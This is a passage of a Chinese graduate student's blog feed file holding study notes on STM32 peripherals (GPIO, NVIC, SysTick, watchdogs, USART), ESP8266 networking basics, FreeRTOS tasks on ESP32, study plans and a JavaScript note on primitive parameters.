        <content type="html"><![CDATA[<p><a href="f270768e-6a79-4d1d-8fd8-694008c8a311">天天PLAN</a></p><h2 id="第一节"><a href="#第一节" class="headerlink" title="第一节"></a>第一节</h2><h3 id="LED的注意事项"><a href="#LED的注意事项" class="headerlink" title="LED的注意事项"></a>LED的注意事项</h3><ol><li>需要连接电阻，不然可能击穿LED。</li><li><strong>一般LED所需电流为0~10+的毫安【不要超过20mA】，芯片所提供电压为3.3 or 5v，所以接一个1kΩ电阻【限流电阻】即可。</strong></li><li><a href="https://blog.csdn.net/a419116194/article/details/103238872">高电平、低电平</a>。低电平时电路的阻抗低，噪声造成的电平变化小，也就是说，抗干扰能力更强</li></ol><h2 id="第二节"><a href="#第二节" class="headerlink" title="第二节"></a>第二节</h2><h3 id="GPIO的注意事项"><a href="#GPIO的注意事项" class="headerlink" title="GPIO的注意事项"></a>GPIO的注意事项</h3><ol><li>除了GPIO的为通用<del>， 其余皆为复用</del></li></ol><p><img src="./images/1668134920148.png" alt="端口配置"><br>2. <strong>GPIO大部分使用推挽输出，ⅡC使用的开漏输出。</strong><br>3. 地址=基址+偏移地址<br>4. 端口配置寄存器【输入输出配置（模拟、浮空、上拉下拉、保留）（通用推挽、通用开漏、复用推挽、复用开漏），输入输出模式以及频率】–&gt;端口输出数据寄存器（配置端口地址为1的是输出端口）</p><h2 id="第四节"><a href="#第四节" class="headerlink" title="第四节"></a>第四节</h2><ol><li>AHB 高速总线、APB普通外设总结、</li><li><strong>通过APB为GPIO提供RCC时钟源，才可以使外设与CPU连接。</strong></li></ol><p><img src="./images/1668182227309.png" alt="使能GPIO"></p><ol start="3"><li>volatile 避免从缓冲区取值，只能从寄存器中取值。</li></ol><h2 id="第七节"><a href="#第七节" class="headerlink" title="第七节"></a>第七节</h2><ol><li>使用结构体可以定义连续的的相关配置，因为结构体中遍历在内存中是连续的。</li><li>使用STM32官方库需要引入相关文件。</li></ol><p><img src="./images/1668181982839.png" alt="依赖文件"></p><p><img src="./images/1668182057720.png" alt="依赖文件"></p><p><img src="./images/1668182110452.png" alt="库文件"></p><h2 id="第八节-按键控制"><a href="#第八节-按键控制" class="headerlink" title="第八节 按键控制"></a>第八节 按键控制</h2><p><img src="./images/1668242764890.png" alt="低电平输入"></p><ol><li>利用按键进行控制led时，可以利用内部的上拉电位，以此输入高电平，按键后输入低电平，以此控制LED</li></ol><h2 id="第九节呼吸灯"><a href="#第九节呼吸灯" class="headerlink" title="第九节呼吸灯"></a>第九节呼吸灯</h2><ol><li>有两种方式，一种是通过修改平均电平，第二种是通过修改PWM</li></ol><p><img src="./images/1668321362358.png" alt="修改电平，变亮就是增加高电平所占时间"></p><h2 id="第十一节NVIC"><a href="#第十一节NVIC" class="headerlink" title="第十一节NVIC"></a>第十一节NVIC</h2><p><img src="https://files.shanqianche.cn/202211/1668324442560.png" alt="抢占优先级和响应优先级"></p><ol><li>从优先级（响应优先级）,在抢占优先级相同时谁的高谁优先。</li></ol><p><img src="https://files.shanqianche.cn/202211/1668325634113.png" alt="外部中断模式"><br>2. 事件请求：当前事件完成后跳转到中断向量表。中断请求：立刻跳转到中断向量表。</p><p><img src="https://files.shanqianche.cn/202211/1668326173434.png" alt="功能复用"><br>3. 需要考虑到pin复用。时钟和中断。</p><p><img src="https://files.shanqianche.cn/202211/1668326286702.png" alt="外部中断初始化"><br>4. 外部中断EXTI0的配置包括：向量化中断控制器的配置、PA0配置为外部中断、中断工作模式（下降沿检测）</p><h2 id="第十三节SysTick-最后一个异常"><a href="#第十三节SysTick-最后一个异常" class="headerlink" title="第十三节SysTick 最后一个异常"></a>第十三节SysTick 最后一个异常</h2><ol><li>SysTick是系统内部计时器，CorTex-M3内包含。其是一个24位的计时器，基本模式是从一个reload 值递减，为0时触发异常，然后重新计数。</li></ol><p><img src="https://files.shanqianche.cn/202211/1668328540665.png" alt="SysTick CTRL"></p><ol start="2"><li>多久减一可以通过CLKSOURCE来设置，AHB为告诉外部时钟，为72MHZ。频率=1/时钟，所以时钟越大，精度越高。</li></ol><p><img src="https://files.shanqianche.cn/202211/1668329188316.png" alt="时钟为72MHZ，reload value为72，最后1微妙产生一次异常中断"><br>3. 产生一次异常时间的设置。</p><h2 id="第十四节"><a href="#第十四节" class="headerlink" title="第十四节"></a>第十四节</h2><p><img src="https://files.shanqianche.cn/202211/1668346317638.png" alt="时钟配置"></p><p><img src="https://files.shanqianche.cn/202211/1668346298839.png" alt="开启时钟，设置全局变量，使其在异常函数中进行递减"><br><img src="https://files.shanqianche.cn/202211/1668346363077.png" alt="SysTick异常函数"></p><ol><li>延时函数</li></ol><h2 id="第十五节"><a href="#第十五节" class="headerlink" title="第十五节"></a>第十五节</h2><ol><li>stm32 有两个看门狗，一个独立看门狗，一个窗口看门狗</li></ol><p><img src="https://files.shanqianche.cn/202211/1668348073923.png" alt="IWDG"><br><img src="https://files.shanqianche.cn/202211/1668348218257.png" alt="IWDG主要功能"><br>2. 独立看门狗（IWDG）依赖LSI（低速内部时钟），即使晶振，外部时钟不工作，IWDG依旧正常工作</p><p><img src="https://files.shanqianche.cn/202211/1668348022275.png" alt="依赖APB1的外设"><br><img src="https://files.shanqianche.cn/202211/1668348100750.png" alt="WWDG"></p><p><img src="https://files.shanqianche.cn/202211/1668348325069.png" alt="IWDG框图"></p><p><img src="https://files.shanqianche.cn/202211/1668348444032.png" alt="键寄存器"><br><img src="https://files.shanqianche.cn/202211/1668390061020.png" alt="reload value为625，pr预分频因子为4时，IWDG就会每隔一秒钟复位一次"><br>3. WWDG依赖APB1，所以APB1出问题，无法工作。</p><p><img src="https://files.shanqianche.cn/202211/1668390482984.png" alt="设置IWDG，第一步取消写保护，设置PR"></p><p><img src="https://files.shanqianche.cn/202211/1668390706177.png" alt="第一步"><br><img src="https://files.shanqianche.cn/202211/1668390795034.png" alt="第二步PR的设置"></p><p><img src="https://files.shanqianche.cn/202211/1668390820968.png" alt="第三步reload value"><br><img src="https://files.shanqianche.cn/202211/1668390977778.png" alt="第四步装入reload value"></p><p><img src="https://files.shanqianche.cn/202211/1668391016821.png" alt="第五步使能"></p><p><img src="https://files.shanqianche.cn/202211/1668391395544.png" alt="IWDG_initt code"><br>5. 4. IWDG的设置</p><h2 id="第16节课WWDG"><a href="#第16节课WWDG" class="headerlink" title="第16节课WWDG"></a>第16节课WWDG</h2><ol><li><strong>偶尔的两次异常，即正常状态到异常状态、接着异常状态又到正常状态，这属于异常，如果这两步操作在异常恢复时间内，即喂狗时间内，IWDG是无法检测到的。而WWDG可以解决。</strong></li></ol><p><img src="https://files.shanqianche.cn/202211/1668392219848.png" alt="特殊异常"><br>2. WWDG喂狗机制，当WWDG的递减计数器1T[6:0]大于上限窗口W[6:0]时1，如果尝试去喂狗，将立刻产生CPU复位。</p><p><img src="https://files.shanqianche.cn/202211/1668392718745.png" alt="只有在0x60-0x3F内喂狗才有效"><br><img src="https://files.shanqianche.cn/202211/1668393252329.png" alt="WWDG原理"></p><p><img src="https://files.shanqianche.cn/202211/1668393442189.png" alt="enter description here"></p><p><img src="https://files.shanqianche.cn/202211/1668393484988.png" alt="喂狗"></p><ol start="3"><li>WWDG配置code<pre><code>- 因为WWDG是与APB1连接的，所以需要从APB1相关函数使能WWDG- 初始化WWDG，配置计数，计数是有上限的，通过与最大值进行想与来限制。- 设置预分频值（PR）- 设置上窗口值- 使能并且喂狗</code></pre></li></ol><p><img src="https://files.shanqianche.cn/202211/1668495595263.png" alt="WWDG初始化配置"></p><p><img src="https://files.shanqianche.cn/202211/1668495613227.png" alt="中断向量表初始化"></p><p>必须进行喂狗，不然CPU会不断进行重启。<br><img src="https://files.shanqianche.cn/202211/1668495643575.png" alt="喂狗"></p><h2 id="第十七节USART"><a href="#第十七节USART" class="headerlink" title="第十七节USART"></a>第十七节USART</h2><ol><li>主要用于芯片与芯片之间的传输</li><li>芯片与PC之间的通信</li><li>芯片与外围模块之间的通信 </li></ol><p>UART 异步功能<br>USART 同步功能<br>USART_CK具有时钟功能<br>USART_CTS具有流控功能，因为不同设备之间频率不一样，接发速率也不一样，CTS可以控制是否接受或者发送数据【硬件流控】，可以用于判断是否进行发送数据<br>USART_RTS发送请求</p><h3 id="代码-amp-逻辑"><a href="#代码-amp-逻辑" class="headerlink" title="代码&amp;逻辑"></a>代码&amp;逻辑</h3><ol><li>开启对应总线的时钟，同时需要开启GPIO管脚的时钟</li></ol>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> study, graduate student,STM32 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ESP32-8266 NodeMCU</title>
      <link href="/2022/11/09/ESP32-8266%20NodeMCU/"/>
      <url>/2022/11/09/ESP32-8266%20NodeMCU/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1L7411c7jw/?p=3&spm_id_from=pageDriver&vd_source=6dbca05574a96cc5925db86217ad31cc">太极创客</a></p><h1 id="互联网基础"><a href="#互联网基础" class="headerlink" title="互联网基础"></a>互联网基础</h1><h2 id="网络基础"><a href="#网络基础" class="headerlink" title="网络基础"></a>网络基础</h2><p><img src="https://files.shanqianche.cn/202211/1667983767588.png" alt="OSI"></p><p><img src="https://files.shanqianche.cn/202211/1667983869801.png" alt="WiFi"></p><h2 id="物理链路层（联网的工作模式）"><a href="#物理链路层（联网的工作模式）" class="headerlink" title="物理链路层（联网的工作模式）"></a>物理链路层（联网的工作模式）</h2><h3 id="接入点模式Access-Point"><a href="#接入点模式Access-Point" class="headerlink" title="接入点模式Access Point"></a>接入点模式Access Point</h3><p><img src="https://files.shanqianche.cn/202211/1667983980074.png" alt="接入点模式，AP"></p><h3 id="无线终端模式Wireless-Station"><a href="#无线终端模式Wireless-Station" class="headerlink" title="无线终端模式Wireless Station"></a>无线终端模式Wireless Station</h3><p><img src="https://files.shanqianche.cn/202211/1667984100987.png" alt="无线终端"></p><h3 id="混合模式"><a href="#混合模式" class="headerlink" title="混合模式"></a>混合模式</h3><p><img src="https://files.shanqianche.cn/202211/1667984176398.png" alt="混合模式"></p><h2 id="网络层IP协议"><a href="#网络层IP协议" class="headerlink" title="网络层IP协议"></a>网络层IP协议</h2><p><img src="https://files.shanqianche.cn/202211/1667984483353.png" alt="IP协议"></p><p><img src="https://files.shanqianche.cn/202211/1667984514957.png" alt="子网掩码"></p><h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><h3 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h3><h1 id="网络服务器"><a href="#网络服务器" class="headerlink" title="网络服务器"></a>网络服务器</h1>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> study, graduate student,NodeMCU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于ESP32学习Free RTOS</title>
      <link href="/2022/11/01/%E5%9F%BA%E4%BA%8EESP32%E5%AD%A6%E4%B9%A0Free%20RTOS/"/>
      <url>/2022/11/01/%E5%9F%BA%E4%BA%8EESP32%E5%AD%A6%E4%B9%A0Free%20RTOS/</url>
      
        <content type="html"><![CDATA[<h1 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h1><p><a href="https://freertos.org/RTOS-task-states.html">参考官方文档</a><br><a href="https://www.bilibili.com/video/BV1Nb4y1q7xz/?spm_id_from=333.788&vd_source=6dbca05574a96cc5925db86217ad31cc">参考Michael_ee老师教学</a>  </p><ul><li><input checked="" disabled="" type="checkbox"> 了解Free RTOS的启动机制</li><li><input disabled="" type="checkbox"> 掌握task</li><li><input disabled="" type="checkbox"> 掌握list </li><li><input disabled="" type="checkbox"> 掌握queue</li></ul><h1 id="GD32F450-移植FreeRTOS"><a href="#GD32F450-移植FreeRTOS" class="headerlink" title="GD32F450 移植FreeRTOS"></a>GD32F450 移植FreeRTOS</h1><h1 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h1><h2 id="基本应用程序启动流程"><a href="#基本应用程序启动流程" class="headerlink" title="基本应用程序启动流程"></a>基本应用程序启动流程</h2><h3 id="框架结构"><a href="#框架结构" class="headerlink" title="框架结构"></a>框架结构</h3><ol><li>First stage bootloader</li></ol><blockquote><p>位于只读的ROM，主动在flash的0x1000偏移地址处加载second stage bootloader 到RAM（IRAM &amp; DRAM）中。</p></blockquote><p>位于components的bootloader文件夹中，都为build文件。</p><ol start="2"><li>Second stage bootloader</li></ol><blockquote><p>从flash中加载分区表和主程序镜像。主程序中包含RAM段和通过flash高速缓存映射的只读段。</p></blockquote><p>位于components/bootloader_support文件夹中，包含了各种芯片的初始化启动代码。</p><ol start="3"><li>Application startup（应用程序入口）</li></ol><blockquote><p>第二个CPU和RTOS的调度器启动。</p></blockquote><p>位于components/freertos文件夹中，核心文件为==list.c #F44336==、==queue.c #FF5722==、==task.c #FF9800==。其中port文件夹中针对不同系统的移植代码。</p><p><img src="https://files.shanqianche.cn/202211/1667286874288.png" alt="针对不同内核的移植代码"></p><h3 id="应用程序的调用顺序"><a href="#应用程序的调用顺序" class="headerlink" title="应用程序的调用顺序"></a>应用程序的调用顺序</h3><blockquote><p>位于 ==freeRTOS #00BCD4==<br>-&gt; app_main()<br>-&gt; 【port_common.c】main_task()<br>-&gt;【port_common.c】xTaskCreatePinnedToCord() 创建了一个main_task<br>-&gt; 在esp_startup_start_app_common()中利用xTaskCreatePinnedToCord创建main_task()<br>-&gt; 【port.c】esp_startup_start_app_common() 此函数主要用于创建对所有task的调度操作，涉及到优先级<br>位于==esp-system #00BCD4==<br>-&gt; 【startup.c】start_cpu0_default() 该函数主要初始化核心组件及服务。<br>-&gt; 【startup.c】弱连接到start_cpu0(), 该函数中涉及到硬件初始化<br>-&gt; 【startup_internal.h】g_startup_fn[] 数组可以调用不同的cpu初始化<br>-&gt; 【stratup_internal.h】#define SYS_STARTUP_FN() 宏定义<br>-&gt; 【cpu_start.c】call_start_cpu0()，由于esp32只有一个内核，所以只会被cpu0调用，这个函数同时调用了esp_mspi_pin_init用于初始化esp，，以及调用了bootloader<br>-&gt; 【sections.id.in链接文件】ENTRY(call_start_cpu0) ; 应用程序入口</p></blockquote><p><img src="https://files.shanqianche.cn/202211/1667287763318.png" alt="task创建了一个main_task"></p><p><img src="https://files.shanqianche.cn/202211/1667288388845.png" alt="start_cpu0()弱连接"></p><h2 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h2><h3 id="Task-基本设置"><a href="#Task-基本设置" class="headerlink" title="Task 基本设置"></a>Task 基本设置</h3><h4 id="xTaskCrate"><a href="#xTaskCrate" class="headerlink" title="xTaskCrate()"></a>xTaskCrate()</h4><p><img src="https://files.shanqianche.cn/202211/1667291790344.png" alt="xTaskCreate"><br>pvTaskCode: task函数。<br>pcName: task name。<br>usstackDepth: 表示分配的内存。<br>*pvParmeters: 为task函数的参数指针 ==(void *) #FF9800== ，可以由xTaskCreate函数传递到pvTaskCode。<br>uxPriority: task执行优先级，空闲状态为0，所以一般设置值大于0。<br>*pxCreatedTask: task的handle，可以获得task很多信息，类似与于进程的ID。</p><h5 id="TASK四种类型"><a href="#TASK四种类型" class="headerlink" title="TASK四种类型"></a>TASK四种类型</h5><ol><li>参数为整数</li></ol><p><img src="https://files.shanqianche.cn/202211/1667293389173.png" alt="参数为整数"></p><h5 id="参数为数组"><a href="#参数为数组" class="headerlink" title="参数为数组"></a>参数为数组</h5><blockquote><p>数组名为地址，所以不需要取址</p></blockquote><p><img src="https://files.shanqianche.cn/202211/1667293510828.png" alt="参数为数组"></p><h5 id="参数为结构体"><a href="#参数为结构体" class="headerlink" title="参数为结构体"></a>参数为结构体</h5><p><img src="https://files.shanqianche.cn/202211/1667293604613.png" alt="结构体"></p><h5 id="参数为字符串常量"><a href="#参数为字符串常量" class="headerlink" title="参数为字符串常量"></a>参数为字符串常量</h5><p><img src="https://files.shanqianche.cn/202211/1667293674918.png" alt="字符串常量"></p><h4 id="vTaskDelete-xHandle"><a href="#vTaskDelete-xHandle" class="headerlink" title="vTaskDelete(xHandle)"></a>vTaskDelete(xHandle)</h4><p>删除Task</p><h4 id="vTaskDelay"><a href="#vTaskDelay" class="headerlink" title="vTaskDelay()"></a>vTaskDelay()</h4><p>时延</p><h3 id="Task-Priorities"><a href="#Task-Priorities" class="headerlink" title="Task Priorities"></a>Task Priorities</h3><blockquote><p>系统优先级的范围为[0, max-1]，当task设置的优先级超过最大值时会默认为最大值。<br>==尽量不要修改配置中的优先级最大值，会占用很大内存 #FF572</p></blockquote><p><img src="https://files.shanqianche.cn/202211/1667297323036.png" alt="该宏被设置为1时，优先级不能超过32"></p><h4 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h4><p><img src="https://files.shanqianche.cn/202211/1667296693484.png" alt="优先级的定义"></p><p><img src="https://files.shanqianche.cn/202211/1667296735778.png" alt="配置文件路径"></p><p><img src="https://files.shanqianche.cn/202211/1667296782216.png" alt="优先级的定义"></p><h4 id="uxTaskPriorityGet"><a href="#uxTaskPriorityGet" class="headerlink" title="uxTaskPriorityGet()"></a>uxTaskPriorityGet()</h4><p><img src="https://files.shanqianche.cn/202211/1667296913491.png" alt="获取任务优先级"></p><p><img src="https://files.shanqianche.cn/202211/1667297027490.png" alt="get task priority"></p><h4 id="Same-Priority"><a href="#Same-Priority" class="headerlink" title="Same Priority"></a>Same Priority</h4><pre><code>相同优先级的task，则顺序运行，基于robin调度机制使用时间片共享一个进程时间段。</code></pre><p><img src="https://files.shanqianche.cn/202211/1667297529065.png" alt="Same Priority"></p><h4 id="different-Priority"><a href="#different-Priority" class="headerlink" title="different Priority"></a>different Priority</h4><p>优先级高的先执行，与顺序无关。</p><h4 id="Modify-Priority"><a href="#Modify-Priority" class="headerlink" title="Modify Priority"></a>Modify Priority</h4><blockquote><p>修改优先级 vTaskPrioritySet(TaskHandle_t px, priority);</p></blockquote><p><img src="https://files.shanqianche.cn/202211/1667298265387.png" alt="修改优先级"><br>修改，马上根据新的优先级执行。</p><h3 id="Task-States"><a href="#Task-States" class="headerlink" title="Task States"></a>Task States</h3><blockquote><p>运行状态、准备状态、阻塞状态、挂起状态</p></blockquote><p><img src="https://files.shanqianche.cn/202211/1667298712509.png" alt="task state"></p><p><strong>注意：</strong><br>对于阻塞状态有超时的概念，对于挂起状态则没有这种概念。</p><h4 id="vTaskSuspend-挂起-amp-vTaskResume-恢复"><a href="#vTaskSuspend-挂起-amp-vTaskResume-恢复" class="headerlink" title="vTaskSuspend 挂起 &amp; vTaskResume 恢复"></a>vTaskSuspend 挂起 &amp; vTaskResume 恢复</h4><p><img src="https://files.shanqianche.cn/202212/1670336283287.png" alt="task被挂起并恢复"></p><h4 id="vTaskSuspendAll-挂起所有-amp-vTaskResumeAll-恢复所有"><a href="#vTaskSuspendAll-挂起所有-amp-vTaskResumeAll-恢复所有" class="headerlink" title="vTaskSuspendAll() 挂起所有 &amp; vTaskResumeAll() 恢复所有"></a>vTaskSuspendAll() 挂起所有 &amp; vTaskResumeAll() 恢复所有</h4><p> 挂起所有task，同时执行完后不能调用FreeRTOS API函数。必须通过vTaskResumeAll（）进行恢复后才能继续直接FreeRTOS API。<strong>保证程序的独立运行</strong></p><p> <img src="https://files.shanqianche.cn/202212/1670336505558.png" alt="指的是系统被挂起后无法被调用"></p><h3 id="vTaskList-任务状态信息"><a href="#vTaskList-任务状态信息" class="headerlink" title="vTaskList() 任务状态信息"></a>vTaskList() 任务状态信息</h3><p> <img src="https://files.shanqianche.cn/202212/1670480943006.png" alt="vTaskList展示task信息"> </p><blockquote><p>运行状态<br>     X: 运行状态<br>    B:阻塞状态<br>    R:准备状态<br>    S:挂起状态<br>    D:删除状态</p></blockquote><h3 id="xTask堆栈"><a href="#xTask堆栈" class="headerlink" title="xTask堆栈"></a>xTask堆栈</h3><p><img src="https://files.shanqianche.cn/202212/1670506507182.png" alt="xTask堆栈的设置"><br><strong>usStackDepth的理解</strong>： 为堆栈的深度。即如果堆栈的宽度为4bytes，深度为100，则堆栈空间为100* 4bytes。</p><p><img src="https://files.shanqianche.cn/202212/1670507145359.png" alt="usStackDepth"></p><h4 id="uxTaskGetStackHighWaterMark-查询剩余堆栈内存"><a href="#uxTaskGetStackHighWaterMark-查询剩余堆栈内存" class="headerlink" title="uxTaskGetStackHighWaterMark() 查询剩余堆栈内存"></a>uxTaskGetStackHighWaterMark() 查询剩余堆栈内存</h4><p>调用vTaskList消耗内存较大，可以通过uxTaskGetStackHighWaterMark来获取内存信息。</p>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> study, graduate student </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-10-10研究生的第一个十天计划</title>
      <link href="/2022/10/10/2022-10-10%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%81%E5%A4%A9%E8%AE%A1%E5%88%92/"/>
      <url>/2022/10/10/2022-10-10%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%81%E5%A4%A9%E8%AE%A1%E5%88%92/</url>
      
        <content type="html"><![CDATA[<h1 id="近十天安排"><a href="#近十天安排" class="headerlink" title="近十天安排"></a>近十天安排</h1><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><blockquote><p><a href="https://www.bilibili.com/video/BV1Yv411t7qe/?spm_id_from=333.337.search-card.all.click&vd_source=6dbca05574a96cc5925db86217ad31cc">结合B站邴哲松老师授课 </a><br>C+++Primer+Plus（第6版）</p></blockquote><ol><li>第一天，第一章</li><li>第二天，第四章</li><li>第三天，第五章</li><li>第四天，第六章</li><li>第五天，第七章</li><li>第六天，第八章</li><li>第七天，第九章</li><li>第八天，第十章</li><li>第九天，第十一章，视频没了，自己看书</li><li>第十天，复习一到十章</li></ol><h2 id="点灯"><a href="#点灯" class="headerlink" title="点灯"></a>点灯</h2><ol><li>第一天，看完主要的几个协议</li><li>第二天，点亮stm32f103c8t6</li><li>第三天，继续学习ARM<h2 id="PCB课程"><a href="#PCB课程" class="headerlink" title="PCB课程"></a>PCB课程</h2><blockquote><p>通过看视频方式学习</p></blockquote></li></ol><p>每天看五节课</p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>每天一道算法题，当日任务少则做新类型的题，任务多则做简单题型。</p><h1 id="下一个十天"><a href="#下一个十天" class="headerlink" title="下一个十天"></a>下一个十天</h1><ol><li>模电重新学习</li><li>ARM</li><li>估计要准备中期，so</li></ol>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> study,graduate student,plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-9-13研究生的倒数第245天</title>
      <link href="/2022/09/13/2022-9-13%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC245%E5%A4%A9/"/>
      <url>/2022/09/13/2022-9-13%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%AC245%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO-List"><a href="#TODO-List" class="headerlink" title="TODO List"></a>TODO List</h1><ul><li><input disabled="" type="checkbox"> 9:00~10:00 今日学习学习            <strong><font color="#D2691E">前端基础速通</font></strong></li><li><input disabled="" type="checkbox"> 10:00~10:20 上午学习总结        <strong><font color="#D2691E">算法</font></strong></li><li><input disabled="" type="checkbox"> 10:20~10:50 breaking news【一三五】   <strong><font color="#D2691E">js进阶</font></strong></li><li><input disabled="" type="checkbox"> 10:50~11:20 刘畅【二四六】   <strong><font color="#D2691E">微信小程序</font></strong></li></ul><hr><ul><li><input disabled="" type="checkbox"> 14:00~15:00 今日学习安排            <strong><font color="#ff7500">todo-2</font></strong></li><li><input disabled="" type="checkbox"> 15:00~16:00 今日学习安排            <strong><font color="#01274F">todo-3</font></strong></li><li><input disabled="" type="checkbox"> 16:00~16:40 今日学习安排            <strong><font color="#2e4e7e">todo-4</font></strong></li><li><input disabled="" type="checkbox"> 16:40~17:10 下午学习总结</li></ul><hr><ul><li><input disabled="" type="checkbox"> 18:30~20:00 无字幕版美剧</li><li><input disabled="" type="checkbox"> 20:00~21:30 晚上学习安排            <strong><font color="#8B008B">todo-5</font></strong></li><li><input disabled="" type="checkbox"> 21:30~22:10 晚上学习安排            <strong><font color="#7FFF00">todo-6</font></strong></li><li><input disabled="" type="checkbox"> 22:10~22:30 晚上学习总结</li></ul>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> FE </tag>
            
            <tag> deep learning </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript中原始类型有趣的事</title>
      <link href="/2022/08/24/JavaScript%E4%B8%AD%E5%8E%9F%E5%A7%8B%E7%B1%BB%E5%9E%8B%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BA%8B-DESKTOP-861NK7E/"/>
      <url>/2022/08/24/JavaScript%E4%B8%AD%E5%8E%9F%E5%A7%8B%E7%B1%BB%E5%9E%8B%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BA%8B-DESKTOP-861NK7E/</url>
      
        <content type="html"><![CDATA[<h1 id="函数参数命名出现的问题"><a href="#函数参数命名出现的问题" class="headerlink" title="函数参数命名出现的问题"></a>函数参数命名出现的问题</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 基本类型</span><br><span class="line">let foo = 5;</span><br><span class="line"></span><br><span class="line">// 定义一个貌似可以改变基本类型值的函数</span><br><span class="line">function addTwo(num) &#123;</span><br><span class="line">    num += 2;</span><br><span class="line">&#125;</span><br><span class="line">// 和前面的函数一样</span><br><span class="line">function addTwo_v2(foo) &#123;</span><br><span class="line">    foo += 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 调用第一个函数，并传入基本类型值作为参数</span><br><span class="line">addTwo(foo);</span><br><span class="line">// Getting the current Primitive value</span><br><span class="line">console.log(foo);   // 5</span><br><span class="line"></span><br><span class="line">// 尝试调用第二个函数...</span><br><span class="line">addTwo_v2(foo);</span><br><span class="line">console.log(foo);   // 5</span><br></pre></td></tr></table></figure><p><strong>你是否认为会得到7，而不是5？如果是，请看看代码是如何运行的：</strong></p><ul><li>addTwo和addTwo_v2函数调用时，JavaScript 会检查标识符foo的值，从而准确无误的找到第一行实例化变量的声明语句。</li><li>找到以后，JavaScript 将其作为参数传递给函数的形参。</li><li>在执行函数体内语句之前，JavaScript 会将传递进来的参数（基本类型的值）复制一份，<font color="#FF00FF">创建一个本地副本。</font>这个副本只存在于该函数的作用域中，我们能够通过指定在函数中的标识符访问到它（addTwo中的num，addTwo_v2中的foo）。</li><li>接下来，函数体中的语句开始执行：<ul><li>第一个函数中，创建了本地num参数，num的值加 2，但这个值并不是原来的foo的值。</li><li>第二个函数中，创建了本地参数foo，并将它的值加 2，<font color="#FF00FF">这个值不是外部 foo 的值。在这种情况下，外部的foo变量不能以任何方式被访问到。这是因为 JavaScript 的词法作用域（lexical scoping）所导致的变量覆盖，本地的变量foo覆盖了外部的变量foo。</font>欲知详情，请参阅闭包。</li></ul></li><li>综上所述，函数中的任何操作都不会影响到最初的foo，我们操作的只不过是它的副本。</li></ul>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript中原始类型有趣的事</title>
      <link href="/2022/08/24/JavaScript%E4%B8%AD%E5%8E%9F%E5%A7%8B%E7%B1%BB%E5%9E%8B%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BA%8B/"/>
      <url>/2022/08/24/JavaScript%E4%B8%AD%E5%8E%9F%E5%A7%8B%E7%B1%BB%E5%9E%8B%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BA%8B/</url>
      
